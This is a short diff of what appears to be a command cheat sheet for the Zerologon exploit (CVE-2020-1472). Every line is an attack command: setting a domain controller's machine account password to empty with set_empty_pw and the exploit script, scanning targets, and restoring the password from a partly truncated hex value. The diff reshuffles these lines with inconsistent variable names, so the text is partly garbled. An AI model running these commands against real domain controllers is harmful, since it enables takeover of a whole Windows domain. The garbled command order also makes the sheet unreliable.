@@ -1,8 +1,8 @@
+set_empty_pw "$TARGET" "$IP"
+zerologon-restore "$DOMAIN"/dc01@"$DC_HOST" -target-ip "$TARGET" -hexpass "69762...6945d"
 # Zerologon — CVE-2020-1472
 cve-2020-1472-exploit $DC_HOST $DC_IP
 restorepassword $DOMAIN/$DC_HOST@$DC_HOST -target-ip $DC_IP -hexpass $HEX_PASS
 zerologon-scan DC01 "$DC_HOST"
-zerologon-restore "$DOMAIN"/dc01@"$DC_HOST" -target-ip "$TARGET" -hexpass "69762...6945d"
-set_empty_pw "$TARGET" "$IP"
-zerologon-scan "$TARGET" "$IP"
 zerologon-restore "$DOMAIN/$TARGET"@"$IP" -target-ip "$IP" -hexpass "$HEXPASS"
+zerologon-scan "$TARGET" "$IP"
